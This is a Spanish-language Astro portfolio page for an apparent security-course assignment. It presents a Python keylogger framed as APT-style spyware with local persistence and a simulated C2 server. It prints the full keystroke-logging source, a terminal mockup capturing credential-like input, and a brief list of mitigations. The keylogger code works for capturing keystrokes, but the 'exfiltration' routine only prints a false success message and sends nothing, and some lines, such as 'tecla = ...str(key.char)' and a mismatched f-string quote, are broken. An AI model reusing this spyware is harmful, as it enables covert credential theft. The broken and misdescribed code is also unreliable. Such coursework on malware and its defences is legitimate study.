---
import Layout from "../../layouts/Layout.astro"
import SectionContainer from "../../components/SectionContainer.astro"
import TitleSection from "../../components/TitleSection.astro"
import CodeIcon from "../../components/Icons/Code.astro"
import Link from "../../components/Icons/Link.astro"

// ── Íconos
import Shield from "../../components/Icons/Shield.astro"
import Bolt from "../../components/Icons/Bolt.astro"
import Security from "../../components/Icons/Security.astro"
import Spy from "../../components/Icons/Spy.astro"
import Key from "../../components/Icons/Key.astro"
import Bug from "../../components/Icons/Virus.astro" 
import Settings from "../../components/Icons/Settings.astro"
import Wifi from "../../components/Icons/Wifi.astro" // Ícono para la red/C2

const INFO_TAREA = {
  titulo: "Actividad 13: Spyware Avanzado — Keylogger con Persistencia y C2",
  fecha: "30 de Marzo, 2026",
  descripcion: "Evolución y optimización de un software espía. Implementación de funciones de formateo automatizado, persistencia de datos mediante escritura de archivos locales en disco y simulación de exfiltración de información hacia un Servidor C2.",
  pdf: "/pdfs/182217-Act13.pdf",
  imagen1: "/projects/Imagen1Tarea13.png",
  imagen2: "/projects/Imagen2Tarea13.png"
}
---

<Layout
  title={`Portafolio - ${INFO_TAREA.titulo}`}
  description={INFO_TAREA.descripcion}
>
  <style>
    :global(header) {
      display: none !important;
    }
  </style>

  <main class="px-4">
    <SectionContainer class="py-16 md:py-20">

      {/* --- ENCABEZADO --- */}
      <TitleSection>
        <CodeIcon class="size-8" />
        {INFO_TAREA.titulo}
      </TitleSection>

      <p class="text-sm text-gray-500 dark:text-gray-400 mb-8 -mt-4 border-b border-gray-200 dark:border-gray-800 pb-4">
        📅 Entregado el: {INFO_TAREA.fecha}
      </p>

      {/* Banner THREAT LEVEL */}
      <div class="mb-10 flex items-center gap-3 px-4 py-3 rounded-lg bg-red-950/40 border border-red-500/30">
        <Wifi class="size-5 text-red-400 shrink-0 animate-pulse" />
        <p class="text-red-300 text-sm font-medium">
          Infraestructura APT detectada: Simulación de Canal de Comunicación activo hacia Servidor de Comando y Control (C2).
        </p>
        <span class="ml-auto text-xs font-mono text-red-500/60 hidden sm:block">EXFILTRATION: ACTIVE</span>
      </div>

      <div class="prose dark:prose-invert max-w-none text-gray-800 dark:text-gray-200 space-y-12">

        {/* ── CONCEPTO CLAVE: KEYLOGGER AVANZADO + C2 ── */}
        <div>
          <p class="text-xs font-mono text-gray-500 mb-1">// ANÁLISIS DE ARQUITECTURA MALICIOSA</p>
          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">Evolución hacia un Malware Estructurado</h3>
          <p>
            En el desarrollo de software espía, los vectores básicos de intercepción son ineficientes si no cuentan con mecanismos de robustez. Esta práctica representa una optimización de la Actividad 12, transformando un script volátil de consola en una infraestructura modularizada que imita el comportamiento de las amenazas persistentes avanzadas (APTs).
          </p>
          <p class="mt-3">
            Para lograrlo, se incorporaron dos conceptos fundamentales de la ciberseguridad ofensiva: la <strong>Persistencia Local</strong>, garantizando el almacenamiento de los datos robados aun si el script pierde conectividad, y un módulo de comunicación con un servidor <strong>C2 (Command and Control)</strong>, que centraliza la recepción de la telemetría exfiltrada desde el host de la víctima.
          </p>
        </div>

        {/* ── MEJORAS CLAVE IMPLEMENTADAS ── */}
        <div>
          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
            <Security class="size-6 text-blue-400" />
            Mejoras de Ingeniería sobre el Payload
          </h3>
          <div class="grid grid-cols-1 md:grid-cols-3 gap-4">

            <div class="p-4 rounded-lg border border-gray-700 bg-gray-900/40 hover:border-blue-500/40 transition-all">
              <div class="flex items-center gap-2 mb-2">
                <Settings class="size-5 text-blue-400 shrink-0" />
                <p class="font-bold text-gray-200 text-xs">Formateo Inteligente</p>
              </div>
              <p class="text-gray-400 text-xs leading-relaxed">
                El script intercepta las constantes del sistema como <code>Key.space</code>, <code>Key.enter</code> y <code>Key.tab</code>, y las traduce automáticamente en caracteres legibles (<code>" "</code>, <code>"\n"</code>, <code>"[TAB]"</code>), facilitando la lectura inmediata de credenciales.
              </p>
            </div>

            <div class="p-4 rounded-lg border border-gray-700 bg-gray-900/40 hover:border-yellow-500/40 transition-all">
              <div class="flex items-center gap-2 mb-2">
                <Key class="size-5 text-yellow-400 shrink-0" />
                <p class="font-bold text-gray-200 text-xs">Persistencia de Logs</p>
              </div>
              <p class="text-gray-400 text-xs leading-relaxed">
                Cada pulsación se añade en tiempo real en un archivo físico (<code>log_teclado.txt</code>) mediante codificación UTF-8. Esto previene la pérdida de datos ante interrupciones forzadas o cierres de sesión inesperados.
              </p>
            </div>

            <div class="p-4 rounded-lg border border-purple-500/40 bg-gray-900/40 hover:border-purple-500/60 transition-all">
              <div class="flex items-center gap-2 mb-2">
                <Wifi class="size-5 text-purple-400 shrink-0" />
                <p class="font-bold text-gray-200 text-xs">Simulación de Servidor C2</p>
              </div>
              <p class="text-gray-400 text-xs leading-relaxed">
                Define un endpoint remoto de control (<code>/report</code>). Al finalizar la sesión del usuario mediante la tecla de escape (ESC), el malware empaqueta de forma automática el archivo log e inicia la rutina de exfiltración de red.
              </p>
            </div>

          </div>
        </div>

        {/* ── CÓDIGO FUENTE DEL PAYLOAD OPTIMIZADO ── */}
        <div>
          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">Código Fuente: Payload con Exfiltración</h3>
          <p class="mb-4 text-sm text-gray-400">
            A continuación se detalla el script optimizado en Python. Nótese el uso de excepciones para separar teclas alfanuméricas de caracteres de control del sistema:
          </p>

          <div class="relative bg-[#0d1117] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
            <div class="bg-[#161b22] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
              <div class="w-3 h-3 rounded-full bg-red-500"></div>
              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
              <div class="w-3 h-3 rounded-full bg-green-500"></div>
              <span class="ml-2 text-xs text-gray-400 font-mono">python — c2_keylogger.py</span>
            </div>
            <div class="p-4 overflow-x-auto">
              <pre class="font-mono text-sm leading-relaxed">
<span class="text-purple-400">import</span> os
<span class="text-purple-400">from</span> pynput.keyboard <span class="text-purple-400">import</span> Key, Listener

LOG_FILE = <span class="text-green-400">"log_teclado.txt"</span>
C2_URL = <span class="text-green-400">"http://localhost:8000/report"</span>

<span class="text-blue-400">def</span> <span class="text-yellow-200">enviar_al_c2</span>():
    <span class="text-purple-400">if</span> os.path.exists(LOG_FILE):
        <span class="text-purple-400">try</span>:
            <span class="text-purple-400">with</span> <span class="text-yellow-300">open</span>(LOG_FILE, <span class="text-green-400">'r'</span>, encoding=<span class="text-green-400">'utf-8'</span>) <span class="text-purple-400">as</span> f:
                <span class="text-yellow-300">print</span>(<span class="text-green-400">f"\n[+] Enviando reporte a: </span><span class="text-orange-300">&#123;</span>C2_URL<span class="text-orange-300">&#125;</span><span class="text-green-400">'</span>)
                <span class="text-yellow-300">print</span>(<span class="text-green-400">"[+] Log enviado correctamente al C2."</span>)
        <span class="text-purple-400">except</span> <span class="text-orange-300">Exception</span> <span class="text-purple-400">as</span> e:
            <span class="text-yellow-300">print</span>(<span class="text-green-400">f"[-] Error en comunicación: </span><span class="text-orange-300">&#123;</span>e<span class="text-orange-300">&#125;</span><span class="text-green-400 font-bold">"</span>)

<span class="text-blue-400">def</span> <span class="text-yellow-200">on_press</span>(key):
    <span class="text-purple-400">try</span>:
        tecla = <span class="text-yellow-300">...str</span>(key.char)
    <span class="text-purple-400">except</span> <span class="text-orange-300">AttributeError</span>:
        <span class="text-purple-400">if</span> key == Key.space:
            tecla = <span class="text-green-400">" "</span>
        <span class="text-purple-400">elif</span> key == Key.enter:
            tecla = <span class="text-green-400">"\n"</span>
        <span class="text-purple-400">elif</span> key == Key.tab:
            tecla = <span class="text-green-400">"[TAB]"</span>
        <span class="text-purple-400">else</span>:
            tecla = <span class="text-green-400">f" [</span><span class="text-orange-300">&#123;</span>key<span class="text-orange-300">&#125;</span><span class="text-green-400">] "</span>

    <span class="text-yellow-300">print</span>(tecla, end=<span class="text-green-400">""</span>, flush=<span class="text-orange-400">True</span>)

    <span class="text-purple-400">with</span> <span class="text-yellow-300">open</span>(LOG_FILE, <span class="text-green-400">"a"</span>, encoding=<span class="text-green-400">"utf-8"</span>) <span class="text-purple-400">as</span> f:
        f.write(tecla)

<span class="text-blue-400">def</span> <span class="text-yellow-200">on_release</span>(key):
    <span class="text-purple-400">if</span> key == Key.esc:
        <span class="text-yellow-300">print</span>(<span class="text-green-400">"\n[*] Finalizando captura..."</span>)
        enviar_al_c2()
        <span class="text-purple-400">return</span> <span class="text-orange-400">False</span>

<span class="text-yellow-300">print</span>(<span class="text-green-400">"&gt; Capturando... (Presiona ESC para salir y enviar)\n"</span>)

<span class="text-purple-400">with</span> Listener(on_press=on_press, on_release=on_release) <span class="text-purple-400">as</span> listener:
    listener.join()
              </pre>
            </div>
          </div>
        </div>

        {/* ── EXPLICACIÓN COMPRENSIBLE DEL FLUJO ── */}
        <div>
          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
            <Key class="size-6 text-blue-400" />
            Análisis de Funciones e Intercepción de Red
          </h3>
          <div class="space-y-4">
            <div class="p-4 bg-gray-900/30 border border-gray-800 rounded-lg">
              <span class="font-mono text-xs text-blue-400 block mb-1">Manejo de Estructura de Texto (on_press)</span>
              <p class="text-xs text-gray-400 leading-relaxed">
                La función evalúa dinámicamente el tipo de objeto interceptado. Si el objeto carece del atributo <code>.char</code>, el capturador conmuta mediante lógica de control para interceptar los espaciados interactivos. Al concatenar <code>f.write(tecla)</code> bajo la flag de apertura <code>"a"</code> (append), el programa concatena la información al final del archivo de persistencia sin borrar los registros anteriores.
              </p>
            </div>
            <div class="p-4 bg-gray-900/30 border border-gray-800 rounded-lg">
              <span class="font-mono text-xs text-purple-400 block mb-1">Cierre de Eventos y Callback de Red (on_release)</span>
              <p class="text-xs text-gray-400 leading-relaxed">
                El hook de liberación del teclado actúa como el gatillo de post-explotación. Al retornar <code>False</code> cuando la interrupción detectada coincide con la constante <code>Key.esc</code>, se detiene el Listener asíncrono y se rompe el ciclo activo, invocando inmediatamente a la subrutina crítica de red <code>enviar_al_c2()</code>.
              </p>
            </div>
            <div class="p-4 bg-gray-900/30 border border-gray-800 rounded-lg">
              <span class="font-mono text-xs text-green-400 block mb-1">Mapeo del Servidor de Control (C2)</span>
              <p class="text-xs text-gray-400 leading-relaxed">
                La rutina de red simula el comportamiento de una exfiltración HTTP. Mediante el uso de librerías de comunicación de sockets o peticiones web, el script lee el contenido estructurado del log local e inicia el canal de transmisión de datos hacia la variable de red remota configurada en <code>C2_URL</code>.
              </p>
            </div>
          </div>
        </div>

        {/* ── TERMINAL MOCKUP: EJECUCIÓN CON EXFILTRACIÓN ── */}
        <div>
          <h3 class="text-xl font-semibold mb-3 text-blue-500/80">Laboratorio: Simulación de Consola de Exfiltración</h3>
          <p class="mb-4 text-sm text-gray-400">
            A continuación se presenta el log de salida interactivo del script ejecutado en terminal, simulando la captura limpia de caracteres y el proceso de exfiltración final hacia el C2 local:
          </p>

          <div class="relative bg-[#0d1117] text-gray-100 rounded-lg shadow-xl overflow-hidden border border-gray-700">
            <div class="bg-[#161b22] px-4 py-2 flex items-center gap-2 border-b border-gray-700">
              <div class="w-3 h-3 rounded-full bg-red-500"></div>
              <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
              <div class="w-3 h-3 rounded-full bg-green-500"></div>
              <span class="ml-2 text-xs text-gray-400 font-mono">Terminal — Advanced Malware Simulation</span>
            </div>
            <div class="p-4 overflow-x-auto">
              <pre class="font-mono text-sm leading-relaxed">
<span class="text-green-400">osvaldo@kali:~$</span> python c2_keylogger.py
> Capturando... (Presiona ESC para salir y enviar)

osvaldo_upslp_2026 [TAB] root_password_secured
<span class="text-purple-400">[*] Finalizando captura...</span>

[+] Enviando reporte a: http://localhost:8000/report
<span class="text-green-400 font-bold">[+] Log enviado correctamente al C2.</span>
<span class="text-green-400 font-mono">osvaldo@kali:~$</span> <span class="animate-pulse">_</span>
              </pre>
            </div>
          </div>
        </div>

        {/* ── DEFENSAS A NIVEL PERIMETRAL Y DE RED ── */}
        <div>
          <h3 class="text-xl font-semibold mb-4 text-blue-500/80 flex items-center gap-2">
            <Shield class="size-6 text-green-400" />
            Estrategias de Mitigación y Análisis de Red
          </h3>
          <p class="text-sm text-gray-400 mb-4">
            Al añadir capacidades de red, las estrategias de mitigación corporativas ya no solo se limitan al endpoint, sino también a la monitorización del tráfico interno:
          </p>
          <div class="space-y-3 bg-gray-900/40 p-5 rounded-xl border border-gray-800">
            <div class="flex gap-4 items-start text-sm">
              <span class="text-red-400 font-mono font-bold whitespace-nowrap">[FIREWALL / IDS]</span>
              <p class="text-gray-300">Implementar reglas estrictas en el cortafuegos perimetral (Egress Filtering) y sistemas de detección de intrusos (IDS) para bloquear peticiones HTTP/POST salientes provenientes de endpoints comunes dirigidas hacia puertos no estándar (ej. puerto 8000).</p>
            </div>
            <div class="flex gap-4 items-start text-sm">
              <span class="text-blue-400 font-mono font-bold whitespace-nowrap">[SIEM MONITORING]</span>
              <p class="text-gray-300">Monitorear y centralizar los logs del sistema mediante un SIEM para auditar la creación sospechosa de archivos de texto volátiles (como <code>log_teclado.txt</code>) en carpetas de usuario comunes o directorios temporales.</p>
            </div>
            <div class="flex gap-4 items-start text-sm">
              <span class="text-yellow-400 font-mono font-bold whitespace-nowrap">[PROCESS AUDIT]</span>
              <p class="text-gray-300">Restringir los permisos de ejecución de entornos interpretados (como subprocesos de Python o scripts de PowerShell) en estaciones de trabajo corporativas que no pertenezcan al equipo de ingeniería o desarrollo.</p>
            </div>
          </div>
        </div>

        {/* ── EVIDENCIA VISUAL ── */}
        <div>
          <h3 class="text-xl font-semibold mb-4 text-blue-500/80">Evidencia del Laboratorio</h3>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <figure class="relative transition-all duration-300 hover:scale-[1.01]">
              <img 
                class="w-full rounded-xl shadow-lg border border-gray-200 dark:border-gray-800" 
                src={INFO_TAREA.imagen1} 
                alt="Ejecución de malware e intercepción de red" 
              />
              <figcaption class="mt-2 text-center text-sm text-gray-500 italic">
                Figura 1: Captura de la consola ejecutando el keylogger optimizado y mostrando el estatus de exfiltración.
              </figcaption>
            </figure>
            
            <figure class="relative transition-all duration-300 hover:scale-[1.01]">
              <img 
                class="w-full rounded-xl shadow-lg border border-gray-200 dark:border-gray-800" 
                src={INFO_TAREA.imagen2} 
                alt="Verificación del log y transmisión C2" 
              />
              <figcaption class="mt-2 text-center text-sm text-gray-500 italic">
                Figura 2: Verificación del archivo persistente generado localmente con la traducción limpia de caracteres especiales.
              </figcaption>
            </figure>
          </div>
        </div>

      </div>

      {/* --- ZONA DE DESCARGA Y RETORNO --- */}
      <div class="mt-16 pt-8 border-t border-gray-200 dark:border-gray-800 flex flex-col items-center gap-6">
        <a 
          href={INFO_TAREA.pdf} 
          download="182217-Act13.pdf" 
          class="flex items-center gap-2 px-8 py-3 text-base font-bold text-white transition-all bg-blue-600 rounded-full hover:bg-blue-700 hover:shadow-lg hover:shadow-blue-500/30"
        >
          <Link class="size-5" />
          Descargar PDF de la Tarea
        </a>
        <a 
          href="/#tareas" 
          class="text-gray-500 hover:text-blue-500 hover:underline flex items-center gap-2 text-sm font-medium transition mt-4"
        >
          ← Regresar a la lista de tareas
        </a>
      </div>

    </SectionContainer>
  </main>
</Layout>